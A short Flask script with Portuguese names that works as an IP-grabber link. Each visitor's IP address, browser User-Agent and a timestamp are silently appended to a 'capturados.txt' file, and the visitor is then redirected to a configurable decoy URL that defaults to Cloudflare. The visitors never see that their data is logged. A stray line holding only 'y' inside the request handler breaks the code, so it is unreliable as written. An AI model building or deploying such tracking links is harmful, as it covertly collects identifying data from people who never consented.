from flask import Flask, request, redirect
import datetime

app = Flask(__name__)
alvo_final = "https://www.cloudflare.com"  # padrão, será atualizado pela função

@app.route("/")
def index():
    ip = request.remote_addr
y
    agente = request.headers.get('User-Agent')
    hora = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    log = f"[{hora}] IP: {ip} - Navegador: {agente}\n"
    print(log)

    with open("capturados.txt", "a") as f:
        f.write(log)

    return redirect(alvo_final)

def definir_url(url):
    global alvo_final
    if not url.startswith("http"):
        url = "https://" + url
    alvo_final = url


